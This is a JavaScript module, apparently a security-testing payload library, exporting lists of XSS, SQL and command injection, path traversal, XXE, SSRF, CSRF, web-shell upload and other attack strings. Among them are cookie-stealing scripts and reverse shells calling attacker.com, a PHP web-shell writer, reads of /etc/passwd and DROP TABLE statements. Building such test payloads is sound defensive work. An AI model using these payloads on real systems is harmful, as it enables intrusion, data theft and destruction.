/**
 * Attack Patterns Library
 * Common attack payloads for security testing
 * 
 * @author Alejandro Navarro Ayala - CEO & Founder, AgroBridge
 */

'use strict';

/**
 * Cross-Site Scripting (XSS) Attack Patterns
 */
const xssPayloads = [
  // Basic script injection
  "<script>alert('XSS')</script>",
  "<script>alert(String.fromCharCode(88,83,83))</script>",
  "<img src=x onerror=alert('XSS')>",
  "<img src=javascript:alert('XSS')>",
  "<body onload=alert('XSS')>",
  
  // Encoded XSS
  "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
  "%3Cscript%3Ealert('XSS')%3C/script%3E",
  "\u003cscript\u003ealert('XSS')\u003c/script\u003e",
  
  // Event handler XSS
  "<svg onload=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "<select onfocus=alert('XSS') autofocus>",
  "<textarea onfocus=alert('XSS') autofocus>",
  "<video><source onerror=alert('XSS')>",
  "<audio src=x onerror=alert('XSS')>",
  
  // JavaScript protocol
  "javascript:alert('XSS')",
  "javascript://%0Aalert('XSS')",
  "JaVaScRiPt:alert('XSS')",
  
  // DOM-based XSS
  "<div id='x' onmouseover='alert(1)' style='width:100px;height:100px'>Hover me</div>",
  "<object data='javascript:alert(1)'>",
  "<embed src='javascript:alert(1)'>",
  "<iframe src='javascript:alert(1)'>",
  
  // Polyglot payloads
  "'--></script><script>alert('XSS')</script>",
  "';alert('XSS');//",
  "';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">\'<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
  
  // Advanced obfuscation
  "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
  "<<script>alert('XSS');//<</script>",
  "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
  "<script>setTimeout('alert(1)',0)</script>",
  
  // HTML5 specific
  "<details open ontoggle=alert('XSS')>",
  "<marquee onstart=alert('XSS')>",
  "<meter onmouseover=alert('XSS')>0</meter>",
  "<progress onmouseover=alert('XSS') value=50 max=100>",
  "<isindex type=image src=1 onerror=alert('XSS')>",
  
  // Template injection variants
  "{{constructor.constructor('alert(1)')()}}",
  "${alert('XSS')}",
  "<%=alert('XSS')%>",
  "#{alert('XSS')}",
  
  // Data exfiltration attempts
  "<script>fetch('https://attacker.com/log?data='+document.cookie)</script>",
  "<img src=x onerror=this.src='https://attacker.com/log?c='+document.cookie>",
  
  // WAF bypass attempts
  "<s%00cript>alert('XSS')</s%00cript>",
  "<script >alert('XSS')</script >",
  "<script/**/>alert('XSS')</script/**/>",
  "<scr%00ipt>alert('XSS')</scr%00ipt>"
];

/**
 * SQL Injection Attack Patterns
 */
const sqlInjectionPayloads = [
  // Classic SQLi
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 1=1#",
  "' OR 1=1/*",
  "' OR '1'='1' --",
  "' OR '1'='1' #",
  "' OR '1'='1' /*",
  "' OR '1'='1' AND 1=1--",
  
  // Union-based
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT username,password FROM users--",
  "' UNION ALL SELECT NULL,NULL,NULL--",
  
  // Error-based
  "' AND 1=CONVERT(int,@@version)--",
  "' AND 1=CONVERT(int,DB_NAME())--",
  "' AND 1=(SELECT @@version)--",
  "' AND 1=(SELECT DB_NAME())--",
  
  // Time-based blind
  "' OR SLEEP(5)--",
  "' OR pg_sleep(5)--",
  "' OR WAITFOR DELAY '0:0:5'--",
  "' OR 1=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  
  // Boolean-based blind
  "' AND 1=1--",
  "' AND 1=2--",
  "' AND 'a'='a",
  "' AND 'a'='b",
  
  // Stacked queries
  "'; DROP TABLE users; --",
  "'; DELETE FROM users; --",
  "'; INSERT INTO users VALUES ('hacker','password'); --",
  
  // NoSQL injection
  "{\"$gt\":\"\"}",
  "{\"$ne\":null}",
  "{\"$regex\":\".*\"}",
  "{\"$where\":\"this.password.length > 0\"}",
  
  // PostgreSQL specific
  "'; COPY users TO '/tmp/users.csv'; --",
  "'; CREATE TABLE shell(cmd text); --",
  
  // MySQL specific
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
  "' INTO OUTFILE '/tmp/shell.php'--",
  
  // MS SQL Server specific
  "'; EXEC xp_cmdshell('dir'); --",
  "'; EXEC master.dbo.xp_dirtree '\\\\attacker.com\\share'; --",
  
  // Comment bypass
  "'/**/OR/**/1=1--",
  "'/**/UNION/**/SELECT/**/NULL--",
  "'+OR+1=1--",
  
  // Encoding bypass
  "%27%20OR%20%271%27%3D%271",
  "%27%20OR%201%3D1--",
  "0x27204F5220313D31--",
  
  // JSON injection
  "{\"username\":\"admin\",\"password\":{\"$ne\":null}}",
  "{\"$or\":[{\"username\":\"admin\"},{\"1\":\"1\"}]}"
];

/**
 * Command Injection Attack Patterns
 */
const commandInjectionPayloads = [
  // Basic command injection
  "; ls -la",
  "; cat /etc/passwd",
  "; whoami",
  "; id",
  "; uname -a",
  
  // Chained commands
  "& whoami",
  "&& whoami",
  "| whoami",
  "|| whoami",
  "`whoami`",
  "$(whoami)",
  
  // Newline injection
  "\nwhoami\n",
  "\nls -la\n",
  "\ncat /etc/passwd\n",
  
  // Encoded commands
  ";\x20ls\x20-la",
  "%3B%20ls%20-la",
  "||\x20id",
  
  // Alternative command execution
  "; echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
  "; nc -e /bin/sh attacker.com 1234",
  "; bash -i >& /dev/tcp/attacker.com/1234 0>&1",
  
  // Windows specific
  "& dir",
  "&& dir",
  "| dir",
  "; type C:\\windows\\system32\\drivers\\etc\\hosts",
  
  // Bypass filters
  ";\twhoami",
  ";${IFS}whoami",
  ";$(printf '%s' 'whoami')",
  ";$(echo 'whoami')",
  
  // File upload injection
  "shell.jpg.php",
  "shell.phar",
  "shell.phtml",
  "shell.jsp;.jpg",
  "shell.aspx.jpg"
];

/**
 * Path Traversal Attack Patterns
 */
const pathTraversalPayloads = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "....//....//....//etc/passwd",
  "....\\\\....\\\\....\\\\windows\\\\win.ini",
  "..%2f..%2f..%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..\x2f..\x2f..\x2fetc\x2fpasswd",
  "/etc/passwd",
  "/windows/win.ini",
  "\\windows\\system.ini",
  "C:\\boot.ini",
  "file:///etc/passwd",
  "file://C:/windows/system32/drivers/etc/hosts",
  
  // Null byte injection (legacy PHP)
  "../../../etc/passwd%00.jpg",
  "shell.php%00.jpg",
  
  // Double encoding
  "%252e%252e%252fetc%252fpasswd",
  "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
  
  // Unicode traversal
  "..%c0%af..%c0%af..%c0%afetc/passwd",
  "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"
];

/**
 * XML External Entity (XXE) Attack Patterns
 */
const xxePayloads = [
  `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`,
  
  `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe" >]>
<foo>&xxe;</foo>`,
  
  `<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root/>`,
  
  `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id" >
]>
<foo>&xxe;</foo>`
];

/**
 * Server-Side Request Forgery (SSRF) Attack Patterns
 */
const ssrfPayloads = [
  "http://169.254.169.254/latest/meta-data/",
  "http://localhost:22",
  "http://127.0.0.1:3306",
  "http://0.0.0.0:6379",
  "http://[::1]:80",
  "file:///etc/passwd",
  "dict://localhost:11211/stat",
  "gopher://localhost:9000/_test",
  "http://0177.0.0.1",
  "http://2130706433",
  "http://0x7f.0x0.0x0.0x1",
  "http://0x7f000001"
];

/**
 * Cross-Site Request Forgery (CSRF) Attack Patterns
 */
const csrfPayloads = [
  // Basic CSRF form
  `<form action="https://target.com/api/donations" method="POST" id="csrf-form">
<input type="hidden" name="amount" value="1000">
<input type="hidden" name="currency" value="USD">
<script>document.getElementById('csrf-form').submit();</script>
</form>`,
  
  // Fetch API CSRF
  `<script>
fetch('https://target.com/api/donations', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({amount: 1000, currency: 'USD'})
});
</script>`,
  
  // Image tag CSRF
  `<img src="https://target.com/api/users/delete?id=123" width="0" height="0">`,
  
  // XHR CSRF
  `<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/change-password', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('newPassword=hacked123');
</script>`
];

/**
 * Open Redirect Attack Patterns
 */
const openRedirectPayloads = [
  "https://evil.com",
  "//evil.com",
  "/\\evil.com",
  "http://evil.com",
  "http:\\evil.com",
  "/%09/evil.com",
  "//%09/evil.com",
  "/%2f%2fevil.com",
  "/%2f%5c%2f%77%65%62%2e%65%76%69%6c%2e%63%6f%6d",
  "///evil.com",
  "////evil.com",
  "https:evil.com",
  "https://target.com.evil.com",
  "https://target.com@evil.com",
  "https://target.com?redirect=evil.com",
  "https://target.com#evil.com"
];

/**
 * NoSQL Injection Attack Patterns
 */
const nosqlInjectionPayloads = [
  '{"$gt":""}',
  '{"$ne":null}',
  '{"$ne":""}',
  '{"$gt":""}',
  '{"$regex":".*"}',
  '{"$where":"1==1"}',
  '{"$where":"this.password.length > 0"}',
  '[$ne]=',
  '[$gt]=',
  '[$regex]=.*'
];

/**
 * LDAP Injection Attack Patterns
 */
const ldapInjectionPayloads = [
  "*)(uid=*))(&(uid=*",
  "*)(uid=*))(&(uid=*",
  "*()|%26",
  "*()|&",
  "*)(cn=*" 
];

/**
 * HTTP Request Smuggling Attack Patterns
 */
const httpRequestSmugglingPayloads = [
  // CL.TE
  `POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5
GPOST / HTTP/1.1

0

`,
  
  // TE.CL
  `POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
`
];

/**
 * JWT Attack Patterns
 */
const jwtAttacks = {
  // None algorithm
  noneAlgorithm: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
  
  // Weak secrets
  weakSecrets: [
    "secret",
    "password",
    "123456",
    "admin",
    "jwt",
    "token",
    "key",
    "agrobridge",
    "test"
  ],
  
  // Algorithm confusion
  algorithmConfusion: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.H9wH5q8j9zvH1zQ0Qz8X4G3a3bE2",
  
  // Expired token with future date
  expiredToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE1MDAwMDAwMDB9.signature"
};

/**
 * File Upload Attack Patterns
 */
const fileUploadAttacks = [
  {
    filename: "shell.php",
    content: "<?php system($_GET['cmd']); ?>",
    mimeType: "image/jpeg"
  },
  {
    filename: "shell.jsp",
    content: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    mimeType: "image/png"
  },
  {
    filename: "shell.asp",
    content: "<% eval request(\"cmd\") %>",
    mimeType: "image/gif"
  },
  {
    filename: "shell.aspx",
    content: "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\", Request[\"cmd\"]); %>",
    mimeType: "image/jpeg"
  },
  {
    filename: "shell.jpg.php",
    content: "<?php system($_GET['cmd']); ?>",
    mimeType: "image/jpeg"
  },
  {
    filename: "shell.php%00.jpg",
    content: "<?php system($_GET['cmd']); ?>",
    mimeType: "image/jpeg"
  },
  {
    filename: "shell.phar",
    content: "<?php __HALT_COMPILER(); ?>",
    mimeType: "application/octet-stream"
  },
  {
    filename: "shell.zip",
    content: "PK",  // ZIP magic bytes
    mimeType: "application/zip"
  },
  {
    filename: "../../../etc/passwd",
    content: "test",
    mimeType: "text/plain"
  },
  {
    filename: "shell.svg",
    content: `<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="expect://id" />
</svg>`,
    mimeType: "image/svg+xml"
  }
];

/**
 * API Abuse Patterns
 */
const apiAbusePatterns = [
  // Mass assignment
  {
    endpoint: "/api/users",
    method: "POST",
    body: {
      email: "test@test.com",
      password: "password123",
      isAdmin: true,
      role: "admin",
      permissions: ["all"]
    }
  },
  
  // IDOR (Insecure Direct Object Reference)
  {
    endpoint: "/api/users/1",  // Try other user IDs
    method: "GET"
  },
  
  // Parameter pollution
  {
    endpoint: "/api/donations?amount=10&amount=1000",
    method: "POST"
  },
  
  // Method override
  {
    endpoint: "/api/users/1?_method=DELETE",
    method: "POST",
    headers: {
      "X-HTTP-Method-Override": "DELETE"
    }
  }
];

/**
 * Header Injection Patterns
 */
const headerInjectionPayloads = [
  {
    name: "Host",
    value: "evil.com"
  },
  {
    name: "X-Forwarded-Host",
    value: "evil.com"
  },
  {
    name: "X-Forwarded-For",
    value: "127.0.0.1, 10.0.0.1"
  },
  {
    name: "X-Real-IP",
    value: "127.0.0.1"
  },
  {
    name: "Referer",
    value: "https://evil.com/phishing"
  },
  {
    name: "Origin",
    value: "https://evil.com"
  },
  {
    name: "X-HTTP-Method-Override",
    value: "DELETE"
  },
  {
    name: "Content-Type",
    value: "application/xml"
  },
  {
    name: "Accept",
    value: "../../etc/passwd{{"
  }
];

/**
 * Generate attack variations
 */
function generateAttackVariations(basePayload, count = 5) {
  const variations = [basePayload];
  
  // URL encoding
  variations.push(encodeURIComponent(basePayload));
  
  // Double URL encoding
  variations.push(encodeURIComponent(encodeURIComponent(basePayload)));
  
  // Base64 encoding
  variations.push(Buffer.from(basePayload).toString('base64'));
  
  // HTML entity encoding
  const htmlEncoded = basePayload.replace(/[<>&"']/g, char => {
    const entities = {'<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#x27;'};
    return entities[char];
  });
  variations.push(htmlEncoded);
  
  // Mixed case
  variations.push(basePayload.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join(''));
  
  return variations.slice(0, count);
}

/**
 * Get all payloads for a specific attack type
 */
function getPayloads(attackType) {
  const payloadMap = {
    'xss': xssPayloads,
    'sql-injection': sqlInjectionPayloads,
    'command-injection': commandInjectionPayloads,
    'path-traversal': pathTraversalPayloads,
    'xxe': xxePayloads,
    'ssrf': ssrfPayloads,
    'csrf': csrfPayloads,
    'open-redirect': openRedirectPayloads,
    'nosql-injection': nosqlInjectionPayloads,
    'ldap-injection': ldapInjectionPayloads,
    'http-smuggling': httpRequestSmugglingPayloads,
    'jwt': jwtAttacks,
    'file-upload': fileUploadAttacks,
    'api-abuse': apiAbusePatterns,
    'header-injection': headerInjectionPayloads
  };
  
  return payloadMap[attackType] || [];
}

/**
 * Get all attack patterns
 */
function getAllAttackPatterns() {
  return {
    xss: xssPayloads,
    sqlInjection: sqlInjectionPayloads,
    commandInjection: commandInjectionPayloads,
    pathTraversal: pathTraversalPayloads,
    xxe: xxePayloads,
    ssrf: ssrfPayloads,
    csrf: csrfPayloads,
    openRedirect: openRedirectPayloads,
    nosqlInjection: nosqlInjectionPayloads,
    ldapInjection: ldapInjectionPayloads,
    httpSmuggling: httpRequestSmugglingPayloads,
    jwt: jwtAttacks,
    fileUpload: fileUploadAttacks,
    apiAbuse: apiAbusePatterns,
    headerInjection: headerInjectionPayloads
  };
}

module.exports = {
  xssPayloads,
  sqlInjectionPayloads,
  commandInjectionPayloads,
  pathTraversalPayloads,
  xxePayloads,
  ssrfPayloads,
  csrfPayloads,
  openRedirectPayloads,
  nosqlInjectionPayloads,
  ldapInjectionPayloads,
  httpRequestSmugglingPayloads,
  jwtAttacks,
  fileUploadAttacks,
  apiAbusePatterns,
  headerInjectionPayloads,
  generateAttackVariations,
  getPayloads,
  getAllAttackPatterns
};